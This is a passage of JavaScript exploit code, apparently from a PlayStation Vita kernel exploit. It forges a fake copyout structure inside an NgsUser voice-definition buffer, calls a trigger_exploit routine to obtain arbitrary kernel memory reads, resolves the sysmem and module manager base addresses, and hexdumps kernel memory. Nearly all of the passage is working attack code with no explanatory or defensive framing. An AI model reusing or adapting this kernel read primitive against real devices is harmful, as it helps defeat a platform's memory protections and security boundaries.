	sceSysmem_base = sceSysmem_base + SCE_SYSMEM_OFFSET;

	logdbg("sysmem_text : 0x" + sceSysmem_base.toString(16));

	return sceSysmem_base & 0xFFFF0000; // Sysmem resolving for any FW, method found by CelesteBlue

}

function ReadKernelMemory(dst_p, src_addr, read_size) {
	mymemset(voiceDef_p + FAKE_COPYOUT_OFFSET, 0, FAKE_COPYOUT_SIZE);
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x04)) / 4] = dst_p;
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x08)) / 4] = src_addr;
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x1C)) / 4] = read_size;

	trigger_exploit();
}

function hexdump_kernel_NgsUser(addr, size) {
	var read_buf_p = allocate_memory(size);
	ReadKernelMemory(read_buf_p, addr, size);
	myhexdump(read_buf_p, size);
}

function kernel_read() {
	var sceSysmem_data_base = 0;
	var modulemgr_base = 0;
	var COPY_SIZE = 0x6000;
	
	var read_buf_p = allocate_memory(COPY_SIZE);
	
	ReadKernelMemory(read_buf_p, sceSysmem_base + 0x28520, 4);
	sceSysmem_data_base = aspace32[read_buf_p / 4] - 0xF8;
	logdbg("sceSysmem_data_base : 0x" + sceSysmem_data_base.toString(16));

	hexdump_kernel_NgsUser(sceSysmem_data_base, 0x80);

	ReadKernelMemory(read_buf_p, sceSysmem_data_base, COPY_SIZE);
	modulemgr_base = aspace32[(read_buf_p + 0x438C) / 4];
	logdbg("modulemgr_base : 0x" + modulemgr_base.toString(16));

	ReadKernelMemory(read_buf_p, modulemgr_base, 0x80);
	hexdump_kernel_NgsUser(modulemgr_base, 0x80);
}